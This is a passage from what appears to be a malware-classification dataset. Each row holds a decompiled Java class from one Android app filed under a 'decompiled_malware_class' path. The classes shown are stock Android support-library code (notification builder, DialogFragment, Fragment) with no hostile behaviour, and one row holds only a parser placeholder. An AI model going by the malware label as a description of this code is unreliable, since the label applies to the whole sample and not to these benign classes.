CharSequence text){     this.mSubText=text;     return this;   }   public Builder setNumber(  int number){     this.mNumber=number;     return this;   }   public Builder setContentInfo(  CharSequence info){     this.mContentInfo=info;     return this;   }   public Builder setProgress(  int max,  int progress,  boolean indeterminate){     this.mProgressMax=max;     this.mProgress=progress;     this.mProgressIndeterminate=indeterminate;     return this;   }   public Builder setContent(  RemoteViews views){     this.mNotification.contentView=views;     return this;   }   public Builder setContentIntent(  PendingIntent intent){     this.mContentIntent=intent;     return this;   }   public Builder setDeleteIntent(  PendingIntent intent){     this.mNotification.deleteIntent=intent;     return this;   }   public Builder setFullScreenIntent(  PendingIntent intent,  boolean highPriority){     this.mFullScreenIntent=intent;     setFlag(128,highPriority);     return this;   }   public Builder setTicker(  CharSequence tickerText){     this.mNotification.tickerText=tickerText;     return this;   }   public Builder setTicker(  CharSequence tickerText,  RemoteViews views){     this.mNotification.tickerText=tickerText;     this.mTickerView=views;     return this;   }   public Builder setLargeIcon(  Bitmap icon){     this.mLargeIcon=icon;     return this;   }   public Builder setSound(  Uri sound){     this.mNotification.sound=sound;     this.mNotification.audioStreamType=-1;     return this;   }   public Builder setSound(  Uri sound,  int streamType){     this.mNotification.sound=sound;     this.mNotification.audioStreamType=streamType;     return this;   }   public Builder setVibrate(  long[] pattern){     this.mNotification.vibrate=pattern;     return this;   }   public Builder setLights(  int argb,  int onMs,  int offMs){     this.mNotification.ledARGB=argb;     this.mNotification.ledOnMS=onMs;     this.mNotification.ledOffMS=offMs;     boolean showLights=(this.mNotification.ledOnMS == 0 || this.mNotification.ledOffMS == 0) ? false : true;     this.mNotification.flags=(showLights ? 1 : 0) | (this.mNotification.flags & (-2));     return this;   }   public Builder setOngoing(  boolean ongoing){     setFlag(2,ongoing);     return this;   }   public Builder setOnlyAlertOnce(  boolean onlyAlertOnce){     setFlag(8,onlyAlertOnce);     return this;   }   public Builder setAutoCancel(  boolean autoCancel){     setFlag(16,autoCancel);     return this;   }   public Builder setDefaults(  int defaults){     this.mNotification.defaults=defaults;     if ((defaults & 4) != 0) {       this.mNotification.flags|=1;     }     return this;   }   private void setFlag(  int mask,  boolean value){     if (value) {       this.mNotification.flags|=mask;     }  else {       this.mNotification.flags&=mask ^ (-1);     }   }   public Builder setPriority(  int pri){     this.mPriority=pri;     return this;   }   public Builder addAction(  int icon,  CharSequence title,  PendingIntent intent){     this.mActions.add(new Action(icon,title,intent));     return this;   }   public Builder setStyle(  Style style){     if (this.mStyle != style) {       this.mStyle=style;       if (this.mStyle != null) {         this.mStyle.setBuilder(this);       }     }     return this;   }   @Deprecated public Notification getNotification(){     return NotificationCompat.IMPL.build(this);   }   public Notification build(){     return NotificationCompat.IMPL.build(this);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\Delegate.code","public interface Delegate {   Drawable getThemeUpIndicator();   void setActionBarDescription(  int i);   void setActionBarUpIndicator(  Drawable drawable,  int i); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\DelegateProvider.code","public interface DelegateProvider {   Delegate getDrawerToggleDelegate(); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\DialogFragment.code","public class DialogFragment extends Fragment implements DialogInterface.OnCancelListener, DialogInterface.OnDismissListener {   private static final String SAVED_BACK_STACK_ID=""android:backStackId"";   private static final String SAVED_CANCELABLE=""android:cancelable"";   private static final String SAVED_DIALOG_STATE_TAG=""android:savedDialogState"";   private static final String SAVED_SHOWS_DIALOG=""android:showsDialog"";   private static final String SAVED_STYLE=""android:style"";   private static final String SAVED_THEME=""android:theme"";   public static final int STYLE_NORMAL=0;   public static final int STYLE_NO_FRAME=2;   public static final int STYLE_NO_INPUT=3;   public static final int STYLE_NO_TITLE=1;   Dialog mDialog;   boolean mDismissed;   boolean mShownByMe;   boolean mViewDestroyed;   int mStyle=0;   int mTheme=0;   boolean mCancelable=true;   boolean mShowsDialog=true;   int mBackStackId=-1;   public void setStyle(  int style,  int theme){     this.mStyle=style;     if (this.mStyle == 2 || this.mStyle == 3) {       this.mTheme=R.style.Theme.Panel;     }     if (theme != 0) {       this.mTheme=theme;     }   }   public void show(  FragmentManager manager,  String tag){     this.mDismissed=false;     this.mShownByMe=true;     FragmentTransaction ft=manager.beginTransaction();     ft.add(this,tag);     ft.commit();   }   public int show(  FragmentTransaction transaction,  String tag){     this.mDismissed=false;     this.mShownByMe=true;     transaction.add(this,tag);     this.mViewDestroyed=false;     this.mBackStackId=transaction.commit();     return this.mBackStackId;   }   public void dismiss(){     dismissInternal(false);   }   public void dismissAllowingStateLoss(){     dismissInternal(true);   }   void dismissInternal(  boolean allowStateLoss){     if (!this.mDismissed) {       this.mDismissed=true;       this.mShownByMe=false;       if (this.mDialog != null) {         this.mDialog.dismiss();         this.mDialog=null;       }       this.mViewDestroyed=true;       if (this.mBackStackId >= 0) {         getFragmentManager().popBackStack(this.mBackStackId,1);         this.mBackStackId=-1;         return;       }       FragmentTransaction ft=getFragmentManager().beginTransaction();       ft.remove(this);       if (allowStateLoss) {         ft.commitAllowingStateLoss();       }  else {         ft.commit();       }     }   }   public Dialog getDialog(){     return this.mDialog;   }   public int getTheme(){     return this.mTheme;   }   public void setCancelable(  boolean cancelable){     this.mCancelable=cancelable;     if (this.mDialog != null) {       this.mDialog.setCancelable(cancelable);     }   }   public boolean isCancelable(){     return this.mCancelable;   }   public void setShowsDialog(  boolean showsDialog){     this.mShowsDialog=showsDialog;   }   public boolean getShowsDialog(){     return this.mShowsDialog;   }   @Override public void onAttach(  Activity activity){     super.onAttach(activity);     if (!this.mShownByMe) {       this.mDismissed=false;     }   }   @Override public void onDetach(){     super.onDetach();     if (!this.mShownByMe && !this.mDismissed) {       this.mDismissed=true;     }   }   @Override public void onCreate(  Bundle savedInstanceState){     super.onCreate(savedInstanceState);     this.mShowsDialog=this.mContainerId == 0;     if (savedInstanceState != null) {       this.mStyle=savedInstanceState.getInt(SAVED_STYLE,0);       this.mTheme=savedInstanceState.getInt(SAVED_THEME,0);       this.mCancelable=savedInstanceState.getBoolean(SAVED_CANCELABLE,true);       this.mShowsDialog=savedInstanceState.getBoolean(SAVED_SHOWS_DIALOG,this.mShowsDialog);       this.mBackStackId=savedInstanceState.getInt(SAVED_BACK_STACK_ID,-1);     }   }   @Override public LayoutInflater getLayoutInflater(  Bundle savedInstanceState){     if (!this.mShowsDialog) {       return super.getLayoutInflater(savedInstanceState);     }     this.mDialog=onCreateDialog(savedInstanceState); switch (this.mStyle) { case 3:       this.mDialog.getWindow().addFlags(24); case 1: case 2:     this.mDialog.requestWindowFeature(1);   break; } if (this.mDialog != null) { return (LayoutInflater)this.mDialog.getContext().getSystemService(""layout_inflater""); } return (LayoutInflater)this.mActivity.getSystemService(""layout_inflater""); } public Dialog onCreateDialog(Bundle savedInstanceState){ return new Dialog(getActivity(),getTheme()); } @Override public void onCancel(DialogInterface dialog){ } @Override public void onDismiss(DialogInterface dialog){ if (!this.mViewDestroyed) { dismissInternal(true); } } @Override public void onActivityCreated(Bundle savedInstanceState){ Bundle dialogState; super.onActivityCreated(savedInstanceState); if (this.mShowsDialog) { View view=getView(); if (view != null) {   if (view.getParent() != null) {     throw new IllegalStateException(""DialogFragment can not be attached to a container view"");   }   this.mDialog.setContentView(view); } this.mDialog.setOwnerActivity(getActivity()); this.mDialog.setCancelable(this.mCancelable); this.mDialog.setOnCancelListener(this); this.mDialog.setOnDismissListener(this); if (savedInstanceState != null && (dialogState=savedInstanceState.getBundle(SAVED_DIALOG_STATE_TAG)) != null) {   this.mDialog.onRestoreInstanceState(dialogState); } } } @Override public void onStart(){ super.onStart(); if (this.mDialog != null) { this.mViewDestroyed=false; this.mDialog.show(); } } @Override public void onSaveInstanceState(Bundle outState){ Bundle dialogState; super.onSaveInstanceState(outState); if (this.mDialog != null && (dialogState=this.mDialog.onSaveInstanceState()) != null) { outState.putBundle(SAVED_DIALOG_STATE_TAG,dialogState); } if (this.mStyle != 0) { outState.putInt(SAVED_STYLE,this.mStyle); } if (this.mTheme != 0) { outState.putInt(SAVED_THEME,this.mTheme); } if (!this.mCancelable) { outState.putBoolean(SAVED_CANCELABLE,this.mCancelable); } if (!this.mShowsDialog) { outState.putBoolean(SAVED_SHOWS_DIALOG,this.mShowsDialog); } if (this.mBackStackId != -1) { outState.putInt(SAVED_BACK_STACK_ID,this.mBackStackId); } } @Override public void onStop(){ super.onStop(); if (this.mDialog != null) { this.mDialog.hide(); } } @Override public void onDestroyView(){ super.onDestroyView(); if (this.mDialog != null) { this.mViewDestroyed=true; this.mDialog.dismiss(); this.mDialog=null; } } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\DummyTabFactory.code","static class DummyTabFactory implements TabHost.TabContentFactory {   private final Context mContext;   public DummyTabFactory(  Context context){     this.mContext=context;   }   @Override public View createTabContent(  String tag){     View v=new View(this.mContext);     v.setMinimumWidth(0);     v.setMinimumHeight(0);     return v;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\Fragment.code","public class Fragment implements ComponentCallbacks, View.OnCreateContextMenuListener {   static final int ACTIVITY_CREATED=2;   static final int CREATED=1;   static final int INITIALIZING=0;   static final int RESUMED=5;   static final int STARTED=4;   static final int STOPPED=3;   private static final SimpleArrayMap<String,Class<?>> sClassMap=new SimpleArrayMap<>();   FragmentActivity mActivity;   boolean mAdded;   View mAnimatingAway;   Bundle mArguments;   int mBackStackNesting;   boolean mCalled;   boolean mCheckedForLoaderManager;   FragmentManagerImpl mChildFragmentManager;   ViewGroup mContainer;   int mContainerId;   boolean mDeferStart;   boolean mDetached;   int mFragmentId;   FragmentManagerImpl mFragmentManager;   boolean mFromLayout;   boolean mHasMenu;   boolean mHidden;   boolean mInLayout;   View mInnerView;   LoaderManagerImpl mLoaderManager;   boolean mLoadersStarted;   int mNextAnim;   Fragment mParentFragment;   boolean mRemoving;   boolean mRestored;   boolean mResumed;   boolean mRetainInstance;   boolean mRetaining;   Bundle mSavedFragmentState;   SparseArray<Parcelable> mSavedViewState;   int mStateAfterAnimating;   String mTag;   Fragment mTarget;   int mTargetRequestCode;   View mView;   String mWho;   int mState=0;   int mIndex=-1;   int mTargetIndex=-1;   boolean mMenuVisible=true;   boolean mUserVisibleHint=true; public static class SavedState implements Parcelable {     public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){       @Override public SavedState createFromParcel(      Parcel in){         return new SavedState(in,null);       }       @Override public SavedState[] newArray(      int size){         return new SavedState[size];       }     } ;     final Bundle mState;     public SavedState(    Bundle state){       this.mState=state;     }     SavedState(    Parcel in,    ClassLoader loader){       this.mState=in.readBundle();       if (loader != null && this.mState != null) {         this.mState.setClassLoader(loader);       }     }     @Override public int describeContents(){       return 0;     }     @Override public void writeToParcel(    Parcel dest,    int flags){       dest.writeBundle(this.mState);     }   } public static class InstantiationException extends RuntimeException {     public InstantiationException(    String msg,    Exception cause){       super(msg,cause);     }   }   public static Fragment instantiate(  Context context,  String fname){     return instantiate(context,fname,null);   }   public static Fragment instantiate(  Context context,  String fname,  Bundle args){     try {       Class<?> clazz=sClassMap.get(fname);       if (clazz == null) {         clazz=context.getClassLoader().loadClass(fname);         sClassMap.put(fname,clazz);       }       Fragment f=(Fragment)clazz.newInstance();       if (args != null) {         args.setClassLoader(f.getClass().getClassLoader());         f.mArguments=args;       }       return f;     }  catch (    ClassNotFoundException e) {       throw new InstantiationException(""Unable to instantiate fragment "" + fname + "": make sure class name exists, is public, and has an empty constructor that is public"",e);     } catch (    IllegalAccessException e2) {       throw new InstantiationException(""Unable to instantiate fragment "" + fname + "": make sure class name exists, is public, and has an empty constructor that is public"",e2);     } catch (    java.lang.InstantiationException e3) {       throw new InstantiationException(""Unable to instantiate fragment "" + fname + "": make sure class name exists, is public, and has an empty constructor that is public"",e3);     }   }   public static boolean isSupportFragmentClass(  Context context,  String fname){     try {       Class<?> clazz=sClassMap.get(fname);       if (clazz == null) {         clazz=context.getClassLoader().loadClass(fname);         sClassMap.put(fname,clazz);       }       return Fragment.class.isAssignableFrom(clazz);     }  catch (    ClassNotFoundException e) {       return false;     }   }   public final void restoreViewState(  Bundle savedInstanceState){     if (this.mSavedViewState != null) {       this.mInnerView.restoreHierarchyState(this.mSavedViewState);       this.mSavedViewState=null;     }     this.mCalled=false;     onViewStateRestored(savedInstanceState);     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onViewStateRestored()"");     }   }   public final void setIndex(  int index,  Fragment parent){     this.mIndex=index;     if (parent != null) {       this.mWho=parent.mWho + "":"" + this.mIndex;     }  else {       this.mWho=""android:fragment:"" + this.mIndex;     }   }   public final boolean isInBackStack(){     return this.mBackStackNesting > 0;   }   public final boolean equals(  Object o){     return super.equals(o);   }   public final int hashCode(){     return super.hashCode();   }   public String toString(){     StringBuilder sb=new StringBuilder(128);     DebugUtils.buildShortClassTag(this,sb);     if (this.mIndex >= 0) {       sb.append("" #"");       sb.append(this.mIndex);     }     if (this.mFragmentId != 0) {       sb.append("" id=0x"");       sb.append(Integer.toHexString(this.mFragmentId));     }     if (this.mTag != null) {       sb.append("" "");       sb.append(this.mTag);     }     sb.append('}');     return sb.toString();   }   public final int getId(){     return this.mFragmentId;   }   public final String getTag(){     return this.mTag;   }   public void setArguments(  Bundle args){     if (this.mIndex >= 0) {       throw new IllegalStateException(""Fragment already active"");     }     this.mArguments=args;   }   public final Bundle getArguments(){     return this.mArguments;   }   public void setInitialSavedState(  SavedState state){     if (this.mIndex >= 0) {       throw new IllegalStateException(""Fragment already active"");     }     this.mSavedFragmentState=(state == null || state.mState == null) ? null : state.mState;   }   public void setTargetFragment(  Fragment fragment,  int requestCode){     this.mTarget=fragment;     this.mTargetRequestCode=requestCode;   }   public final Fragment getTargetFragment(){     return this.mTarget;   }   public final int getTargetRequestCode(){     return this.mTargetRequestCode;   }   public final FragmentActivity getActivity(){     return this.mActivity;   }   public final Resources getResources(){     if (this.mActivity == null) {       throw new IllegalStateException(""Fragment "" + this + "" not attached to Activity"");     }     return this.mActivity.getResources();   }   public final CharSequence getText(  int resId){     return getResources().getText(resId);   }   public final String getString(  int resId){     return getResources().getString(resId);   }   public final String getString(  int resId,  Object... formatArgs){     return getResources().getString(resId,formatArgs);   }   public final FragmentManager getFragmentManager(){     return this.mFragmentManager;   }   public final FragmentManager getChildFragmentManager(){     if (this.mChildFragmentManager == null) {       instantiateChildFragmentManager();       if (this.mState >= 5) {         this.mChildFragmentManager.dispatchResume();       }  else       if (this.mState >= 4) {         this.mChildFragmentManager.dispatchStart();       }  else       if (this.mState >= 2) {         this.mChildFragmentManager.dispatchActivityCreated();       }  else       if (this.mState >= 1) {         this.mChildFragmentManager.dispatchCreate();       }     }     return this.mChildFragmentManager;   }   public final Fragment getParentFragment(){     return this.mParentFragment;   }   public final boolean isAdded(){     return this.mActivity != null && this.mAdded;   }   public final boolean isDetached(){     return this.mDetached;   }   public final boolean isRemoving(){     return this.mRemoving;   }   public final boolean isInLayout(){     return this.mInLayout;   }   public final boolean isResumed(){     return this.mResumed;   }   public final boolean isVisible(){     return (!isAdded() || isHidden() || this.mView == null || this.mView.getWindowToken() == null || this.mView.getVisibility() != 0) ? false : true;   }   public final boolean isHidden(){     return this.mHidden;   }   public final boolean hasOptionsMenu(){     return this.mHasMenu;   }   public final boolean isMenuVisible(){     return this.mMenuVisible;   }   public void onHiddenChanged(  boolean hidden){   }   public void setRetainInstance(  boolean retain){     if (retain && this.mParentFragment != null) {       throw new IllegalStateException(""Can't retain fragements that are nested in other fragments"");     }     this.mRetainInstance=retain;   }   public final boolean getRetainInstance(){     return this.mRetainInstance;   }   public void setHasOptionsMenu(  boolean hasMenu){     if (this.mHasMenu != hasMenu) {       this.mHasMenu=hasMenu;       if (isAdded() && !isHidden()) {         this.mActivity.supportInvalidateOptionsMenu();       }     }   }   public void setMenuVisibility(  boolean menuVisible){     if (this.mMenuVisible != menuVisible) {       this.mMenuVisible=menuVisible;       if (this.mHasMenu && isAdded() && !isHidden()) {         this.mActivity.supportInvalidateOptionsMenu();       }     }   }   public void setUserVisibleHint(  boolean isVisibleToUser){     if (!this.mUserVisibleHint && isVisibleToUser && this.mState < 4) {       this.mFragmentManager.performPendingDeferredStart(this);     }     this.mUserVisibleHint=isVisibleToUser;     this.mDeferStart=!isVisibleToUser;   }   public boolean getUserVisibleHint(){     return this.mUserVisibleHint;   }   public LoaderManager getLoaderManager(){     if (this.mLoaderManager != null) {       return this.mLoaderManager;     }     if (this.mActivity == null) {       throw new IllegalStateException(""Fragment "" + this + "" not attached to Activity"");     }     this.mCheckedForLoaderManager=true;     this.mLoaderManager=this.mActivity.getLoaderManager(this.mWho,this.mLoadersStarted,true);     return this.mLoaderManager;   }   public void startActivity(  Intent intent){     if (this.mActivity == null) {       throw new IllegalStateException(""Fragment "" + this + "" not attached to Activity"");     }     this.mActivity.startActivityFromFragment(this,intent,-1);   }   public void startActivityForResult(  Intent intent,  int requestCode){     if (this.mActivity == null) {       throw new IllegalStateException(""Fragment "" + this + "" not attached to Activity"");     }     this.mActivity.startActivityFromFragment(this,intent,requestCode);   }   public void onActivityResult(  int requestCode,  int resultCode,  Intent data){   }   public LayoutInflater getLayoutInflater(  Bundle savedInstanceState){     return this.mActivity.getLayoutInflater();   }   public void onInflate(  Activity activity,  AttributeSet attrs,  Bundle savedInstanceState){     this.mCalled=true;   }   public void onAttach(  Activity activity){     this.mCalled=true;   }   public Animation onCreateAnimation(  int transit,  boolean enter,  int nextAnim){     return null;   }   public void onCreate(  Bundle savedInstanceState){     this.mCalled=true;   }   public View onCreateView(  LayoutInflater inflater,  ViewGroup container,  Bundle savedInstanceState){     return null;   }   public void onViewCreated(  View view,  Bundle savedInstanceState){   }   public View getView(){     return this.mView;   }   public void onActivityCreated(  Bundle savedInstanceState){     this.mCalled=true;   }   public void onViewStateRestored(  Bundle savedInstanceState){     this.mCalled=true;   }   public void onStart(){     this.mCalled=true;     if (!this.mLoadersStarted) {       this.mLoadersStarted=true;       if (!this.mCheckedForLoaderManager) {         this.mCheckedForLoaderManager=true;         this.mLoaderManager=this.mActivity.getLoaderManager(this.mWho,this.mLoadersStarted,false);       }       if (this.mLoaderManager != null) {         this.mLoaderManager.doStart();       }     }   }   public void onResume(){     this.mCalled=true;   }   public void onSaveInstanceState(  Bundle outState){   }   @Override public void onConfigurationChanged(  Configuration newConfig){     this.mCalled=true;   }   public void onPause(){     this.mCalled=true;   }   public void onStop(){     this.mCalled=true;   }   @Override public void onLowMemory(){     this.mCalled=true;   }   public void onDestroyView(){     this.mCalled=true;   }   public void onDestroy(){     this.mCalled=true;     if (!this.mCheckedForLoaderManager) {       this.mCheckedForLoaderManager=true;       this.mLoaderManager=this.mActivity.getLoaderManager(this.mWho,this.mLoadersStarted,false);     }     if (this.mLoaderManager != null) {       this.mLoaderManager.doDestroy();     }   }   public void initState(){     this.mIndex=-1;     this.mWho=null;     this.mAdded=false;     this.mRemoving=false;     this.mResumed=false;     this.mFromLayout=false;     this.mInLayout=false;     this.mRestored=false;     this.mBackStackNesting=0;     this.mFragmentManager=null;     this.mActivity=null;     this.mFragmentId=0;     this.mContainerId=0;     this.mTag=null;     this.mHidden=false;     this.mDetached=false;     this.mRetaining=false;     this.mLoaderManager=null;     this.mLoadersStarted=false;     this.mCheckedForLoaderManager=false;   }   public void onDetach(){     this.mCalled=true;   }   public void onCreateOptionsMenu(  Menu menu,  MenuInflater inflater){   }   public void onPrepareOptionsMenu(  Menu menu){   }   public void onDestroyOptionsMenu(){   }   public boolean onOptionsItemSelected(  MenuItem item){     return false;   }   public void onOptionsMenuClosed(  Menu menu){   }   @Override public void onCreateContextMenu(  ContextMenu menu,  View v,  ContextMenu.ContextMenuInfo menuInfo){     getActivity().onCreateContextMenu(menu,v,menuInfo);   }   public void registerForContextMenu(  View view){     view.setOnCreateContextMenuListener(this);   }   public void unregisterForContextMenu(  View view){     view.setOnCreateContextMenuListener(null);   }   public boolean onContextItemSelected(  MenuItem item){     return false;   }   public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     writer.print(prefix);     writer.print(""mFragmentId=#"");     writer.print(Integer.toHexString(this.mFragmentId));     writer.print("" mContainerId=#"");     writer.print(Integer.toHexString(this.mContainerId));     writer.print("" mTag="");     writer.println(this.mTag);     writer.print(prefix);     writer.print(""mState="");     writer.print(this.mState);     writer.print("" mIndex="");     writer.print(this.mIndex);     writer.print("" mWho="");     writer.print(this.mWho);     writer.print("" mBackStackNesting="");     writer.println(this.mBackStackNesting);     writer.print(prefix);     writer.print(""mAdded="");     writer.print(this.mAdded);     writer.print("" mRemoving="");     writer.print(this.mRemoving);     writer.print("" mResumed="");     writer.print(this.mResumed);     writer.print("" mFromLayout="");     writer.print(this.mFromLayout);     writer.print("" mInLayout="");     writer.println(this.mInLayout);     writer.print(prefix);     writer.print(""mHidden="");     writer.print(this.mHidden);     writer.print("" mDetached="");     writer.print(this.mDetached);     writer.print("" mMenuVisible="");     writer.print(this.mMenuVisible);     writer.print("" mHasMenu="");     writer.println(this.mHasMenu);     writer.print(prefix);     writer.print(""mRetainInstance="");     writer.print(this.mRetainInstance);     writer.print("" mRetaining="");     writer.print(this.mRetaining);     writer.print("" mUserVisibleHint="");     writer.println(this.mUserVisibleHint);     if (this.mFragmentManager != null) {       writer.print(prefix);       writer.print(""mFragmentManager="");       writer.println(this.mFragmentManager);     }     if (this.mActivity != null) {       writer.print(prefix);       writer.print(""mActivity="");       writer.println(this.mActivity);     }     if (this.mParentFragment != null) {       writer.print(prefix);       writer.print(""mParentFragment="");       writer.println(this.mParentFragment);     }     if (this.mArguments != null) {       writer.print(prefix);       writer.print(""mArguments="");       writer.println(this.mArguments);     }     if (this.mSavedFragmentState != null) {       writer.print(prefix);       writer.print(""mSavedFragmentState="");       writer.println(this.mSavedFragmentState);     }     if (this.mSavedViewState != null) {       writer.print(prefix);       writer.print(""mSavedViewState="");       writer.println(this.mSavedViewState);     }     if (this.mTarget != null) {       writer.print(prefix);       writer.print(""mTarget="");       writer.print(this.mTarget);       writer.print("" mTargetRequestCode="");       writer.println(this.mTargetRequestCode);     }     if (this.mNextAnim != 0) {       writer.print(prefix);       writer.print(""mNextAnim="");       writer.println(this.mNextAnim);     }     if (this.mContainer != null) {       writer.print(prefix);       writer.print(""mContainer="");       writer.println(this.mContainer);     }     if (this.mView != null) {       writer.print(prefix);       writer.print(""mView="");       writer.println(this.mView);     }     if (this.mInnerView != null) {       writer.print(prefix);       writer.print(""mInnerView="");       writer.println(this.mView);     }     if (this.mAnimatingAway != null) {       writer.print(prefix);       writer.print(""mAnimatingAway="");       writer.println(this.mAnimatingAway);       writer.print(prefix);       writer.print(""mStateAfterAnimating="");       writer.println(this.mStateAfterAnimating);     }     if (this.mLoaderManager != null) {       writer.print(prefix);       writer.println(""Loader Manager:"");       this.mLoaderManager.dump(prefix + ""  "",fd,writer,args);     }     if (this.mChildFragmentManager != null) {       writer.print(prefix);       writer.println(""Child "" + this.mChildFragmentManager + "":"");       this.mChildFragmentManager.dump(prefix + ""  "",fd,writer,args);     }   }   public Fragment findFragmentByWho(  String who){     if (!who.equals(this.mWho)) {       if (this.mChildFragmentManager != null) {         return this.mChildFragmentManager.findFragmentByWho(who);       }       return null;     }     return this;   }   void instantiateChildFragmentManager(){     this.mChildFragmentManager=new FragmentManagerImpl();     this.mChildFragmentManager.attachActivity(this.mActivity,new FragmentContainer(){       @Override public View findViewById(      int id){         if (Fragment.this.mView == null) {           throw new IllegalStateException(""Fragment does not have a view"");         }         return Fragment.this.mView.findViewById(id);       }     } ,this);   }   public void performCreate(  Bundle savedInstanceState){     Parcelable p;     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.noteStateNotSaved();     }     this.mCalled=false;     onCreate(savedInstanceState);     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onCreate()"");     }     if (savedInstanceState != null && (p=savedInstanceState.getParcelable(""android:support:fragments"")) != null) {       if (this.mChildFragmentManager == null) {         instantiateChildFragmentManager();       }       this.mChildFragmentManager.restoreAllState(p,null);       this.mChildFragmentManager.dispatchCreate();     }   }   public View performCreateView(  LayoutInflater inflater,  ViewGroup container,  Bundle savedInstanceState){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.noteStateNotSaved();     }     return onCreateView(inflater,container,savedInstanceState);   }   public void performActivityCreated(  Bundle savedInstanceState){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.noteStateNotSaved();     }     this.mCalled=false;     onActivityCreated(savedInstanceState);     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onActivityCreated()"");     }     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchActivityCreated();     }   }   public void performStart(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.noteStateNotSaved();       this.mChildFragmentManager.execPendingActions();     }     this.mCalled=false;     onStart();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onStart()"");     }     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchStart();     }     if (this.mLoaderManager != null) {       this.mLoaderManager.doReportStart();     }   }   public void performResume(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.noteStateNotSaved();       this.mChildFragmentManager.execPendingActions();     }     this.mCalled=false;     onResume();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onResume()"");     }     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchResume();       this.mChildFragmentManager.execPendingActions();     }   }   public void performConfigurationChanged(  Configuration newConfig){     onConfigurationChanged(newConfig);     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchConfigurationChanged(newConfig);     }   }   public void performLowMemory(){     onLowMemory();     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchLowMemory();     }   }   public boolean performCreateOptionsMenu(  Menu menu,  MenuInflater inflater){     boolean show=false;     if (this.mHidden) {       return false;     }     if (this.mHasMenu && this.mMenuVisible) {       show=true;       onCreateOptionsMenu(menu,inflater);     }     if (this.mChildFragmentManager != null) {       return show | this.mChildFragmentManager.dispatchCreateOptionsMenu(menu,inflater);     }     return show;   }   public boolean performPrepareOptionsMenu(  Menu menu){     boolean show=false;     if (this.mHidden) {       return false;     }     if (this.mHasMenu && this.mMenuVisible) {       show=true;       onPrepareOptionsMenu(menu);     }     if (this.mChildFragmentManager != null) {       return show | this.mChildFragmentManager.dispatchPrepareOptionsMenu(menu);     }     return show;   }   public boolean performOptionsItemSelected(  MenuItem item){     if (!this.mHidden) {       if (this.mHasMenu && this.mMenuVisible && onOptionsItemSelected(item)) {         return true;       }       if (this.mChildFragmentManager != null && this.mChildFragmentManager.dispatchOptionsItemSelected(item)) {         return true;       }     }     return false;   }   public boolean performContextItemSelected(  MenuItem item){     if (!this.mHidden) {       if (onContextItemSelected(item)) {         return true;       }       if (this.mChildFragmentManager != null && this.mChildFragmentManager.dispatchContextItemSelected(item)) {         return true;       }     }     return false;   }   public void performOptionsMenuClosed(  Menu menu){     if (!this.mHidden) {       if (this.mHasMenu && this.mMenuVisible) {         onOptionsMenuClosed(menu);       }       if (this.mChildFragmentManager != null) {         this.mChildFragmentManager.dispatchOptionsMenuClosed(menu);       }     }   }   public void performSaveInstanceState(  Bundle outState){     Parcelable p;     onSaveInstanceState(outState);     if (this.mChildFragmentManager != null && (p=this.mChildFragmentManager.saveAllState()) != null) {       outState.putParcelable(""android:support:fragments"",p);     }   }   public void performPause(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchPause();     }     this.mCalled=false;     onPause();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onPause()"");     }   }   public void performStop(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchStop();     }     this.mCalled=false;     onStop();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onStop()"");     }   }   public void performReallyStop(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchReallyStop();     }     if (this.mLoadersStarted) {       this.mLoadersStarted=false;       if (!this.mCheckedForLoaderManager) {         this.mCheckedForLoaderManager=true;         this.mLoaderManager=this.mActivity.getLoaderManager(this.mWho,this.mLoadersStarted,false);       }       if (this.mLoaderManager != null) {         if (!this.mActivity.mRetaining) {           this.mLoaderManager.doStop();         }  else {           this.mLoaderManager.doRetain();         }       }     }   }   public void performDestroyView(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchDestroyView();     }     this.mCalled=false;     onDestroyView();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onDestroyView()"");     }     if (this.mLoaderManager != null) {       this.mLoaderManager.doReportNextStart();     }   }   public void performDestroy(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchDestroy();     }     this.mCalled=false;     onDestroy();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onDestroy()"");     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\FragmentActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6b6939e1"
